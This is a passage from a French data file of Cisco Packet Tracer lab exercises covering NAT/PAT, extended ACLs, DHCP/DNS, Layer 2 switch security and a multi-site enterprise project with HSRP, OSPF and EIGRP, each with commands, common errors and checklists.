          { os: "linux", cmd: "# Sur R2 (ABR) : ajouter le réseau Area 1\nR2(config)# router ospf 1\nR2(config-router)# network 10.0.24.0 0.0.0.3 area 1", commentaire: "R2 annonce le lien vers R4 dans Area 1" },
          { os: "linux", cmd: "# Sur R4 : tout en Area 1\nR4(config)# router ospf 1\nR4(config-router)# router-id 4.4.4.4\nR4(config-router)# network 192.168.4.0 0.0.0.255 area 1\nR4(config-router)# network 10.0.24.0 0.0.0.3 area 1", commentaire: "R4 dans Area 1 uniquement" },
          { os: "linux", cmd: "R1# show ip route ospf", commentaire: "R1 doit voir O (intra Area0) et O IA (routes d'Area1 via R2 ABR)" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip ospf neighbor : adjacences Full établies entre R1-R2-R3",
      "show ip route ospf : routes O pour tous les réseaux Area 0",
      "show ip ospf interface : DR et BDR identifiés sur les segments LAN",
      "OSPF multi-zone : R4 visible dans show ip ospf neighbor de R2",
      "R1 show ip route : routes O IA pour les réseaux d'Area 1"
    ],
    tags: ["packet-tracer", "ospf", "dr-bdr", "multi-zone", "abr", "cisco", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 107,
    titre: "Packet Tracer — NAT/PAT et listes d'accès étendues",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 60,
    description: "Configurer NAT/PAT sur un routeur Cisco dans Packet Tracer pour permettre aux clients LAN d'accéder à Internet, puis combiner avec des ACL étendues pour filtrer le trafic. Topologie typique d'une petite entreprise.",
    objectifs: [
      "Configurer le NAT statique pour un serveur en DMZ",
      "Configurer le PAT (NAT overload) pour les clients LAN",
      "Vérifier les traductions NAT avec show ip nat translations",
      "Créer des ACL étendues pour filtrer le trafic",
      "Combiner NAT et ACL sur la même interface"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Topologie : 1x routeur Cisco 2811 (R1), 1x switch 2960, 3x PCs LAN, 1x serveur web en DMZ, 1x cloud Internet simulé" },
      { type: "reseau", nom: "Adressage LAN : 192.168.1.0/24, WAN (Internet simulé) : 203.0.113.0/30, IP publique R1 : 203.0.113.1" },
      { type: "reseau", nom: "Dans Packet Tracer : utiliser un nuage (Cloud) ou un routeur supplémentaire pour simuler Internet" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Configuration des interfaces et NAT statique",
        contexte: "On définit les interfaces inside (LAN) et outside (WAN) pour NAT, puis on configure un NAT statique pour exposer un serveur web interne avec une IP publique.",
        commandes: [
          { os: "linux", cmd: "# Marquer les interfaces inside/outside :\nR1(config)# interface FastEthernet0/0\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config-if)# ip nat inside\nR1(config-if)# no shutdown\nR1(config)# interface FastEthernet0/1\nR1(config-if)# ip address 203.0.113.1 255.255.255.252\nR1(config-if)# ip nat outside\nR1(config-if)# no shutdown", commentaire: "Interface LAN = inside, interface WAN = outside" },
          { os: "linux", cmd: "# NAT statique pour le serveur web (192.168.1.100 -> 203.0.113.2) :\nR1(config)# ip nat inside source static 192.168.1.100 203.0.113.2", commentaire: "Toujours traduire 192.168.1.100 en 203.0.113.2 (IP publique fixe)" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — PAT (NAT overload) pour les clients LAN",
        contexte: "Le PAT permet à tous les clients du LAN de partager une seule IP publique en différenciant les sessions par les ports TCP/UDP.",
        commandes: [
          { os: "linux", cmd: "# Créer l'ACL identifiant les clients LAN :\nR1(config)# access-list 1 permit 192.168.1.0 0.0.0.255", commentaire: "ACL 1 : autoriser tout le réseau LAN 192.168.1.0/24" },
          { os: "linux", cmd: "# Activer le PAT :\nR1(config)# ip nat inside source list 1 interface FastEthernet0/1 overload", commentaire: "Traduire les IPs de l'ACL 1 vers l'IP de l'interface WAN avec overload (PAT)" },
          { os: "linux", cmd: "# Tester depuis un PC LAN :\n> ping 203.0.113.5     # IP du routeur Internet simulé\nR1# show ip nat translations", commentaire: "Vérifier les traductions NAT actives" }
        ],
        erreurs_courantes: [
          { symptome: "show ip nat translations vide après ping", cause: "Interface outside ou inside non marquée ou ACL incorrecte", solution: "Vérifier ip nat inside sur Fa0/0 et ip nat outside sur Fa0/1. L'ACL doit correspondre aux IPs sources des clients." }
        ]
      },
      {
        titre: "Étape 3 — ACL étendue pour filtrer le trafic",
        contexte: "On ajoute une ACL étendue pour bloquer le trafic Telnet depuis le LAN vers Internet, tout en autorisant HTTP/HTTPS et ICMP.",
        commandes: [
          { os: "linux", cmd: "# ACL étendue nommée :\nR1(config)# ip access-list extended FILTRAGE-LAN\nR1(config-ext-nacl)# deny tcp 192.168.1.0 0.0.0.255 any eq 23\nR1(config-ext-nacl)# permit tcp 192.168.1.0 0.0.0.255 any eq 80\nR1(config-ext-nacl)# permit tcp 192.168.1.0 0.0.0.255 any eq 443\nR1(config-ext-nacl)# permit icmp 192.168.1.0 0.0.0.255 any\nR1(config-ext-nacl)# deny ip any any log", commentaire: "Bloquer Telnet, autoriser HTTP/HTTPS et ICMP, tout le reste bloqué avec log" },
          { os: "linux", cmd: "R1(config)# interface FastEthernet0/0\nR1(config-if)# ip access-group FILTRAGE-LAN in", commentaire: "Appliquer l'ACL en entrée sur l'interface LAN" },
          { os: "linux", cmd: "R1# show ip access-lists FILTRAGE-LAN", commentaire: "Vérifier les compteurs de correspondances après les tests" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip nat translations : traduction PAT visible après ping depuis LAN",
      "NAT statique : 192.168.1.100 traduit en 203.0.113.2 dans la table NAT",
      "Ping LAN -> Internet fonctionne via PAT",
      "ACL FILTRAGE-LAN appliquée en in sur Fa0/0",
      "Telnet bloqué, HTTP/HTTPS autorisés depuis le LAN",
      "show ip access-lists : compteurs match s'incrémentent"
    ],
    tags: ["packet-tracer", "nat", "pat", "acl", "cisco", "internet", "filtrage", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 108,
    titre: "Packet Tracer — DHCP, DNS et services réseau",
    categorie: "reseau",
    niveau: "débutant",
    duree: 45,
    description: "Configurer les services réseau essentiels dans Packet Tracer : serveur DHCP sur routeur Cisco, serveur DNS intégré, et serveur HTTP/HTTPS. Tester la résolution de noms et l'accès web depuis les clients. Simulation réaliste d'un réseau de PME.",
    objectifs: [
      "Configurer le service DHCP sur un routeur Cisco",
      "Configurer un serveur DNS dans Packet Tracer",
      "Configurer un serveur HTTP et y accéder depuis un PC",
      "Tester la résolution DNS et la navigation web",
      "Configurer ip helper-address pour le DHCP relay"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Topologie : 1x routeur 2811 (R1), 1x switch 2960, 3x PCs clients, 1x serveur (DNS+HTTP)" },
      { type: "reseau", nom: "Adressage : réseau 192.168.1.0/24, serveur en IP fixe 192.168.1.10, PCs en DHCP" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Configurer le DHCP sur le routeur",
        contexte: "Dans Packet Tracer, le routeur Cisco peut jouer le rôle de serveur DHCP. On configure un pool DHCP excluant les IPs des équipements fixes.",
        commandes: [
          { os: "linux", cmd: "# Exclure les IPs fixes (routeur + serveur) :\nR1(config)# ip dhcp excluded-address 192.168.1.1 192.168.1.20", commentaire: "Ne pas distribuer les IPs .1 à .20 (réservées aux équipements fixes)" },
          { os: "linux", cmd: "# Créer le pool DHCP :\nR1(config)# ip dhcp pool LAN\nR1(dhcp-config)# network 192.168.1.0 255.255.255.0\nR1(dhcp-config)# default-router 192.168.1.1\nR1(dhcp-config)# dns-server 192.168.1.10\nR1(dhcp-config)# domain-name lab.local", commentaire: "Pool DHCP avec gateway, DNS et nom de domaine" },
          { os: "linux", cmd: "# Sur les PCs : Desktop > IP Configuration > DHCP\nR1# show ip dhcp binding", commentaire: "Activer DHCP sur les PCs et vérifier les baux distribués" }
        ],
        erreurs_courantes: [
          { symptome: "Les PCs n'obtiennent pas d'IP en DHCP", cause: "Le routeur n'a pas l'interface activée ou les PCs sont mal configurés", solution: "Vérifier no shutdown sur l'interface du routeur. Sur le PC, aller dans Desktop > IP Configuration et sélectionner DHCP." }
        ]
      },
      {
        titre: "Étape 2 — Configurer le serveur DNS",
        contexte: "Dans Packet Tracer, le serveur DNS est configuré graphiquement. On crée des enregistrements A pour les noms de domaine locaux.",
        commandes: [
          { os: "both", cmd: "# Sur le serveur (clic sur le serveur) :\n# Onglet Services > DNS\n# Activer : On\n# Ajouter des enregistrements :\n#   www.lab.local -> 192.168.1.10\n#   mail.lab.local -> 192.168.1.11\n# Cliquer Add pour chaque enregistrement", commentaire: "Configurer le service DNS sur le serveur Packet Tracer" },
          { os: "both", cmd: "# Tester depuis un PC :\n# Desktop > Command Prompt\n> nslookup www.lab.local\n> ping www.lab.local", commentaire: "Tester la résolution DNS depuis un PC client" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Serveur HTTP et navigation web",
        contexte: "Packet Tracer intègre un serveur HTTP configurable. On peut modifier la page d'accueil et y accéder depuis le navigateur web des PCs.",
        commandes: [
          { os: "both", cmd: "# Sur le serveur :\n# Onglet Services > HTTP\n# Activer : On\n# Modifier le contenu HTML si souhaité (éditeur intégré)", commentaire: "Activer le service HTTP sur le serveur" },
          { os: "both", cmd: "# Depuis un PC :\n# Desktop > Web Browser\n# URL : http://192.168.1.10\n# Ou : http://www.lab.local (si DNS configuré)", commentaire: "Accéder au serveur web via IP ou nom de domaine" },
          { os: "linux", cmd: "# ip helper-address pour DHCP relay (si serveur DHCP sur un autre réseau) :\nR1(config)# interface FastEthernet0/0\nR1(config-if)# ip helper-address 192.168.2.10", commentaire: "Relayer les broadcasts DHCP vers un serveur sur un autre réseau" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip dhcp binding : PCs ont obtenu des IPs du pool .21 à .254",
      "show ip dhcp pool : réseau, gateway et DNS-server configurés",
      "nslookup www.lab.local : retourne 192.168.1.10",
      "ping www.lab.local depuis un PC : Success",
      "Navigateur web PC : http://www.lab.local affiche la page du serveur"
    ],
    tags: ["packet-tracer", "dhcp", "dns", "http", "services-reseau", "cisco", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 109,
    titre: "Packet Tracer — sécurité switch : Port Security, BPDU Guard et Storm Control",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 60,
    description: "Configurer les mécanismes de sécurité de couche 2 sur les switches Cisco dans Packet Tracer : Port Security pour contrôler les adresses MAC autorisées, BPDU Guard pour protéger contre les switches pirates, et Storm Control pour limiter les broadcasts.",
    objectifs: [
      "Configurer Port Security avec violation shutdown",
      "Utiliser sticky MAC pour apprendre automatiquement les adresses",
      "Configurer BPDU Guard sur les ports d'accès",
      "Activer PortFast pour l'accélération STP",
      "Réactiver un port err-disabled"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Topologie : 1x switch Cisco 2960, 3x PCs, 1x switch pirate (non autorisé)" },
      { type: "reseau", nom: "VLANs déjà configurés — Port Security s'applique sur les ports access" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Port Security avec sticky MAC",
        contexte: "Port Security limite le nombre de MAC autorisées sur un port. En mode sticky, le switch apprend automatiquement les premières MAC et les mémorise dans la configuration.",
        commandes: [
          { os: "linux", cmd: "# Configurer Port Security sur le port de PC1 :\nSW1(config)# interface FastEthernet0/1\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport port-security\nSW1(config-if)# switchport port-security maximum 1\nSW1(config-if)# switchport port-security mac-address sticky\nSW1(config-if)# switchport port-security violation shutdown", commentaire: "Port Security : 1 MAC max, sticky learning, shutdown si violation" },
          { os: "linux", cmd: "# Générer du trafic depuis PC1 pour apprendre sa MAC :\n# PC1 > ping 192.168.1.1\nSW1# show port-security interface FastEthernet0/1", commentaire: "Vérifier : Secure MAC Address = MAC de PC1, Current Addr = 1" },
          { os: "linux", cmd: "SW1# show port-security address", commentaire: "Lister toutes les MAC sticky apprises — Type = SecureSticky" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Tester la violation et réactiver le port",
        contexte: "On branche un PC non autorisé sur un port avec Port Security pour déclencher une violation. Le port passe en err-disabled et doit être réactivé manuellement.",
        commandes: [
          { os: "linux", cmd: "# Débrancher PC1 et brancher PC_PIRATE sur Fa0/1\n# PC_PIRATE a une MAC différente -> violation Port Security\nSW1# show interfaces FastEthernet0/1 status", commentaire: "Le port doit afficher err-disabled après la violation" },
          { os: "linux", cmd: "SW1# show port-security interface FastEthernet0/1", commentaire: "Violation count doit être > 0, Security Violation Action = Shutdown" },
          { os: "linux", cmd: "# Réactiver le port manuellement :\nSW1(config)# interface FastEthernet0/1\nSW1(config-if)# shutdown\nSW1(config-if)# no shutdown", commentaire: "Shutdown puis no shutdown pour sortir de l'état err-disabled" }
        ],
        erreurs_courantes: [
          { symptome: "Le port ne sort pas de err-disabled après no shutdown", cause: "PC_PIRATE est encore branché — violation immédiate au redémarrage", solution: "Rebrancher le PC autorisé AVANT de faire no shutdown sur le port" }
        ]
      },
      {
        titre: "Étape 3 — BPDU Guard et PortFast",
        contexte: "PortFast permet aux ports d'accès de passer immédiatement en état Forwarding sans attendre la convergence STP. BPDU Guard désactive le port si un BPDU (annonce de switch) est reçu — protège contre les switches non autorisés.",
        commandes: [
          { os: "linux", cmd: "# Activer PortFast et BPDU Guard sur tous les ports access :\nSW1(config)# spanning-tree portfast default\nSW1(config)# spanning-tree portfast bpduguard default", commentaire: "Activer globalement PortFast et BPDU Guard sur tous les ports access" },
          { os: "linux", cmd: "# Ou port par port :\nSW1(config)# interface FastEthernet0/2\nSW1(config-if)# spanning-tree portfast\nSW1(config-if)# spanning-tree bpduguard enable", commentaire: "PortFast + BPDU Guard sur un port spécifique" },
          { os: "linux", cmd: "# Tester BPDU Guard : brancher le switch pirate sur Fa0/4\n# Le switch pirate envoie des BPDU -> Fa0/4 passe en err-disabled\nSW1# show interfaces FastEthernet0/4 status", commentaire: "Observer le port passer en err-disabled à cause de BPDU Guard" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show port-security interface Fa0/1 : SecureSticky MAC de PC1 apprise",
      "Branchement PC pirate : port passe en err-disabled (violation)",
      "show port-security : Violation Count > 0",
      "Réactivation port : shutdown + no shutdown après rebranchement PC autorisé",
      "spanning-tree portfast bpduguard default actif sur le switch",
      "Switch pirate sur Fa0/4 : port err-disabled par BPDU Guard"
    ],
    tags: ["packet-tracer", "port-security", "bpdu-guard", "portfast", "err-disabled", "securite-l2", "cisco", "switch"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 110,
    titre: "Packet Tracer — réseau d'entreprise complet (projet de synthèse)",
    categorie: "reseau",
    niveau: "avancé",
    duree: 120,
    description: "Concevoir et implémenter un réseau d'entreprise complet dans Packet Tracer : deux sites interconnectés, VLANs par département, routage OSPF, NAT/PAT, services DHCP/DNS, ACL de sécurité et redondance de passerelle HSRP. TP de synthèse couvrant toutes les compétences réseau du BTS SISR.",
    objectifs: [
      "Concevoir une topologie réseau d'entreprise multi-sites",
      "Implémenter les VLANs et le routage inter-VLAN",
      "Configurer OSPF entre les sites",
      "Mettre en place NAT/PAT pour l'accès Internet",
      "Déployer DHCP, DNS et les ACL de sécurité",
      "Configurer HSRP pour la redondance de passerelle"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Tous les TPs Packet Tracer précédents maîtrisés (id:103 à 109)" },
      { type: "reseau", nom: "Site A : 2x routeurs 2811 (R1-HSRP actif, R2-HSRP standby), 2x switches 2960, 30x PCs" },
      { type: "reseau", nom: "Site B : 1x routeur 2811 (R3), 1x switch 2960, 10x PCs" },
      { type: "reseau", nom: "VLANs : 10=Informatique(192.168.10.0/24), 20=RH(192.168.20.0/24), 30=Direction(192.168.30.0/24)" },
      { type: "reseau", nom: "WAN Site A-B : 10.0.12.0/30 | WAN vers Internet : 203.0.113.0/30" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Infrastructure de base et VLANs Site A",
        contexte: "On commence par construire l'infrastructure du Site A : switches avec VLANs, trunks et assignation des ports. Les deux routeurs partagent la même interface LAN pour HSRP.",
        commandes: [
          { os: "linux", cmd: "# VLANs sur SW1-A et SW2-A :\nSW1-A(config)# vlan 10\nSW1-A(config-vlan)# name Informatique\nSW1-A(config)# vlan 20\nSW1-A(config-vlan)# name RH\nSW1-A(config)# vlan 30\nSW1-A(config-vlan)# name Direction", commentaire: "Créer les 3 VLANs sur les deux switches du Site A" },
          { os: "linux", cmd: "# Trunks entre switches et vers les routeurs :\nSW1-A(config)# interface GigabitEthernet0/1\nSW1-A(config-if)# switchport mode trunk\nSW1-A(config-if)# switchport trunk allowed vlan 10,20,30", commentaire: "Trunk entre SW1-A et SW2-A + vers R1 et R2" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Routage inter-VLAN et HSRP",
        contexte: "Les deux routeurs font du Router-on-a-Stick pour chaque VLAN et partagent une IP virtuelle HSRP par VLAN. R1 est actif, R2 est standby.",
        commandes: [
          { os: "linux", cmd: "# R1 — sous-interfaces avec HSRP :\nR1(config)# interface FastEthernet0/0.10\nR1(config-subif)# encapsulation dot1Q 10\nR1(config-subif)# ip address 192.168.10.2 255.255.255.0\nR1(config-subif)# standby 10 ip 192.168.10.1\nR1(config-subif)# standby 10 priority 110\nR1(config-subif)# standby 10 preempt", commentaire: "R1 actif HSRP VLAN 10 — VIP 192.168.10.1, IP réelle .2" },
          { os: "linux", cmd: "# R2 — même structure avec priorité basse :\nR2(config)# interface FastEthernet0/0.10\nR2(config-subif)# encapsulation dot1Q 10\nR2(config-subif)# ip address 192.168.10.3 255.255.255.0\nR2(config-subif)# standby 10 ip 192.168.10.1\nR2(config-subif)# standby 10 priority 90", commentaire: "R2 standby HSRP VLAN 10 — même VIP .1, IP réelle .3" },
          { os: "linux", cmd: "R1# show standby brief", commentaire: "Vérifier : R1 = Active, R2 = Standby pour chaque groupe HSRP" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — OSPF inter-sites et NAT/PAT",
        contexte: "OSPF interconnecte les deux sites. NAT/PAT sur R1 (et R2 en cas de panne) donne accès Internet à tous les VLANs.",
        commandes: [
          { os: "linux", cmd: "# OSPF sur R1, R2 (Site A) et R3 (Site B) :\nR1(config)# router ospf 1\nR1(config-router)# router-id 1.1.1.1\nR1(config-router)# network 192.168.10.0 0.0.0.255 area 0\nR1(config-router)# network 192.168.20.0 0.0.0.255 area 0\nR1(config-router)# network 192.168.30.0 0.0.0.255 area 0\nR1(config-router)# network 10.0.12.0 0.0.0.3 area 0", commentaire: "OSPF Area 0 sur tous les routeurs" },
          { os: "linux", cmd: "# NAT/PAT sur R1 :\nR1(config)# access-list 10 permit 192.168.0.0 0.0.255.255\nR1(config)# ip nat inside source list 10 interface FastEthernet0/1 overload\n# Marquer inside/outside sur toutes les interfaces concernées", commentaire: "PAT pour tous les VLANs (192.168.0.0/16) vers l'IP WAN de R1" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — DHCP, DNS et ACL de sécurité",
        contexte: "On finalise le déploiement avec les services réseau et les ACL pour sécuriser les flux entre VLANs.",
        commandes: [
          { os: "linux", cmd: "# Pools DHCP sur R1 (un par VLAN) :\nR1(config)# ip dhcp pool VLAN10\nR1(dhcp-config)# network 192.168.10.0 255.255.255.0\nR1(dhcp-config)# default-router 192.168.10.1\nR1(dhcp-config)# dns-server 192.168.10.10", commentaire: "Un pool DHCP par VLAN avec sa propre gateway et DNS" },
          { os: "linux", cmd: "# ACL inter-VLAN : Direction ne peut pas être modifiée par Informatique :\nR1(config)# ip access-list extended PROTECT-DIRECTION\nR1(config-ext-nacl)# deny ip 192.168.10.0 0.0.0.255 192.168.30.0 0.0.0.255\nR1(config-ext-nacl)# permit ip any any\nR1(config)# interface FastEthernet0/0.10\nR1(config-subif)# ip access-group PROTECT-DIRECTION in", commentaire: "Bloquer le trafic de VLAN 10 (Informatique) vers VLAN 30 (Direction)" },
          { os: "linux", cmd: "# Tests finaux :\n# PC VLAN10 -> ping PC VLAN20 : OK (même site)\n# PC VLAN10 -> ping PC VLAN30 : FAIL (ACL)\n# PC Site A -> ping PC Site B : OK (OSPF)\n# PC Site A -> ping 8.8.8.8 : OK (NAT)", commentaire: "Valider tous les flux selon les règles de sécurité définies" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "VLANs 10, 20, 30 créés et actifs sur SW1-A et SW2-A",
      "Trunks inter-switches fonctionnels : show interfaces trunk",
      "HSRP : R1 = Active, R2 = Standby pour les 3 VLANs",
      "show ip ospf neighbor : R1-R2-R3 en adjacence Full",
      "Ping PC Site A -> PC Site B : OK via OSPF",
      "NAT/PAT : ping vers Internet depuis tous les VLANs",
      "ACL PROTECT-DIRECTION : VLAN10 -> VLAN30 bloqué",
      "DHCP : PCs obtiennent des IPs depuis les pools correspondants"
    ],
    tags: ["packet-tracer", "synthese", "vlan", "ospf", "hsrp", "nat", "acl", "dhcp", "entreprise", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  }

,

  {
    id: 111,
    titre: "Projet ALPHA-TECH — Infrastructure réseau d'entreprise complète (4 séances)",
    categorie: "reseau",
    niveau: "avancé",
    duree: 840,
    description: "Projet de synthèse en 4 séances de 3h30 (14h au total) : concevoir, déployer, sécuriser et superviser l'infrastructure réseau de l'entreprise fictive ALPHA-TECH, avec interconnexion siège/agence distante. Couvre VLANs, Port Security, DHCP, HSRP, OSPF, EIGRP, redistribution de routes, ACL, NAT/PAT, VPN IPsec site-à-site, Syslog, SNMP et méthodologie de dépannage. Se termine par une épreuve pratique notée sur scénario de panne injectée.",
    objectifs: [
      "Segmenter un réseau local en VLANs et configurer des liens trunk 802.1Q",
      "Mettre en œuvre une passerelle redondante avec HSRP (haute disponibilité de couche 3)",
      "Déployer un service DHCP centralisé avec relais inter-VLAN",
      "Configurer et faire interagir deux protocoles de routage dynamique (OSPF et EIGRP)",
      "Réaliser une redistribution de routes entre domaines de routage hétérogènes",
      "Sécuriser les accès physiques et logiques (Port Security, ACL)",
      "Mettre en œuvre la translation d'adresses (NAT/PAT) pour l'accès à Internet",
      "Établir un tunnel VPN site-à-site IPsec pour sécuriser les flux inter-sites",
      "Superviser une infrastructure réseau avec Syslog et SNMP",
      "Appliquer une méthodologie structurée de diagnostic et de dépannage réseau"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Modèle OSI/TCP-IP, adressage IPv4, sous-réseaux (VLSM), notions de commutation maîtrisés" },
      { type: "reseau", nom: "Matériel : 2x Switch Catalyst 2960 (SW-LAN-1, SW-LAN-2), 4x Routeur ISR 2911 (R-CORE-A, R-CORE-B, R-WAN-CENTRAL, R-AGENCE), 1x Switch Catalyst 2960 (SW-AGENCE), 5x PC (PC-ADMIN, PC-PROD, PC-AGENCE, PC-TEST, PC-EST), 1x Serveur générique (SRV-SUPERVISION)" },
      { type: "reseau", nom: "Plan d'adressage complet fourni : VLAN10=192.168.10.0/24, VLAN20=192.168.20.0/24, LAN Agence=192.168.50.0/24, liens P2P en /30, Internet simulé=203.0.113.0/29, VLAN supervision=192.168.99.0/24" },
      { type: "reseau", nom: "TPs recommandés avant de commencer : VLAN/Trunk (id:1), HSRP/VRRP (id:75), OSPF (id:5 ou id:77), EIGRP (id:76), ACL (id:79), NAT/PAT (id:6), GRE/VPN (id:82)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Séance 1 (3h30) — Fondations du réseau local : VLANs, Trunking, Port Security, DHCP",
        contexte: "Mise en place de la topologie physique du siège ALPHA-TECH. Segmentation du LAN en VLAN 10 (Administration) et VLAN 20 (Production) sur SW-LAN-1 et SW-LAN-2, reliés par un trunk 802.1Q. Sécurisation des ports d'accès avec Port Security (sticky MAC, violation shutdown). Déploiement du service DHCP sur R-CORE-A avec un pool par VLAN.",
        commandes: [
          { os: "linux", cmd: "# Câblage : PC-ADMIN->SW-LAN-1 Fa0/1, PC-PROD->SW-LAN-1 Fa0/2\n# SW-LAN-1<->SW-LAN-2 via Gi0/1, SW-LAN-2->R-CORE-A et R-CORE-B en Gi0/0\n# R-CORE-A et R-CORE-B -> R-WAN-CENTRAL en Gi0/1\n# Renommer chaque équipement (Config > Display Name) selon le tableau de matériel", commentaire: "Assembler la topologie physique et nommer les équipements" },
          { os: "linux", cmd: "# Création des VLANs sur SW-LAN-1 et SW-LAN-2 :\nvlan 10\nname Administration\nexit\nvlan 20\nname Production\nexit", commentaire: "Créer VLAN 10 (Administration) et VLAN 20 (Production)" },
          { os: "linux", cmd: "# Ports d'accès sur SW-LAN-1 :\ninterface FastEthernet 0/1\nswitchport mode access\nswitchport access vlan 10\nexit\ninterface FastEthernet 0/2\nswitchport mode access\nswitchport access vlan 20\nexit", commentaire: "PC-ADMIN en VLAN 10 (Fa0/1), PC-PROD en VLAN 20 (Fa0/2)" },
          { os: "linux", cmd: "# Trunk SW-LAN-1 <-> SW-LAN-2 :\ninterface GigabitEthernet 0/1\nswitchport mode trunk\nswitchport trunk allowed vlan 10,20\nexit", commentaire: "Trunk 802.1Q restreint aux VLANs 10 et 20 (à appliquer des deux côtés)" },
          { os: "linux", cmd: "# Port Security sur Fa0/1 et Fa0/2 de SW-LAN-1 :\ninterface FastEthernet 0/1\nswitchport port-security\nswitchport port-security maximum 1\nswitchport port-security mac-address sticky\nswitchport port-security violation shutdown\nexit", commentaire: "1 MAC max par port, sticky learning, shutdown en cas de violation — répéter sur Fa0/2" },
          { os: "linux", cmd: "# DHCP sur R-CORE-A :\nip dhcp excluded-address 192.168.10.250 192.168.10.254\nip dhcp excluded-address 192.168.20.250 192.168.20.254\nip dhcp pool POOL_ADMINISTRATION\nnetwork 192.168.10.0 255.255.255.0\ndefault-router 192.168.10.254\ndns-server 8.8.8.8\nexit\nip dhcp pool POOL_PRODUCTION\nnetwork 192.168.20.0 255.255.255.0\ndefault-router 192.168.20.254\ndns-server 8.8.8.8\nexit", commentaire: "Exclure les IPs réservées (.250-.254) AVANT de créer les pools" },
          { os: "linux", cmd: "show vlan brief\nshow interfaces trunk\nshow port-security interface FastEthernet0/1\nshow ip dhcp binding", commentaire: "Vérifications de fin de séance 1" }
        ],
        erreurs_courantes: [
          { symptome: "switchport trunk allowed vlan oublié sur une extrémité du trunk", cause: "Par défaut tous les VLANs sont autorisés mais c'est une mauvaise pratique de sécurité", solution: "Toujours restreindre explicitement les VLANs autorisés des deux côtés du lien trunk (principe de moindre privilège)" },
          { symptome: "Port Security : le port passe en err-disabled après branchement d'un PC non autorisé", cause: "Comportement attendu — violation mode shutdown", solution: "interface Fa0/1 puis shutdown suivi de no shutdown pour réactiver, après avoir rebranché le poste légitime" },
          { symptome: "ip dhcp excluded-address saisi après la création des pools", cause: "Le DHCP a peut-être déjà distribué une IP réservée à une passerelle avant l'exclusion", solution: "Toujours déclarer les exclusions AVANT de créer les pools DHCP" }
        ]
      },
      {
        titre: "Séance 2 (3h30) — Haute disponibilité et routage dynamique : HSRP, OSPF, EIGRP",
        contexte: "Mise en place de la redondance de passerelle HSRP entre R-CORE-A (actif, priorité 110) et R-CORE-B (secours) sur les VLANs 10 et 20. Configuration du routage OSPF (aire 0) au sein du domaine siège, et du routage EIGRP (AS 100) entre R-WAN-CENTRAL et R-AGENCE. Les deux domaines de routage restent volontairement cloisonnés à ce stade.",
        commandes: [
          { os: "linux", cmd: "# HSRP sur R-CORE-A (actif) :\ninterface GigabitEthernet0/0\nno shutdown\nexit\ninterface GigabitEthernet0/0.10\nencapsulation dot1Q 10\nip address 192.168.10.251 255.255.255.0\nstandby version 2\nstandby 10 ip 192.168.10.254\nstandby 10 priority 110\nstandby 10 preempt\nexit\ninterface GigabitEthernet0/0.20\nencapsulation dot1Q 20\nip address 192.168.20.251 255.255.255.0\nstandby version 2\nstandby 20 ip 192.168.20.254\nstandby 20 priority 110\nstandby 20 preempt\nexit", commentaire: "R-CORE-A : sous-interfaces router-on-a-stick + HSRP priorité 110 + preempt" },
          { os: "linux", cmd: "# HSRP sur R-CORE-B (secours) :\ninterface GigabitEthernet0/0.10\nencapsulation dot1Q 10\nip address 192.168.10.252 255.255.255.0\nstandby version 2\nstandby 10 ip 192.168.10.254\nstandby 10 preempt\nexit\n# Idem pour VLAN 20 avec ip 192.168.20.252", commentaire: "R-CORE-B : même groupe HSRP (10), priorité par défaut (100), preempt actif" },
          { os: "linux", cmd: "show standby brief\n# Test bascule : ping continu vers 192.168.10.254 depuis PC-ADMIN\n# puis sur R-CORE-A : interface GigabitEthernet0/0 > shutdown\nshow standby brief\n# Réactiver : no shutdown sur R-CORE-A et vérifier la préemption", commentaire: "Vérifier Active/Standby et tester la bascule en coupant R-CORE-A" },
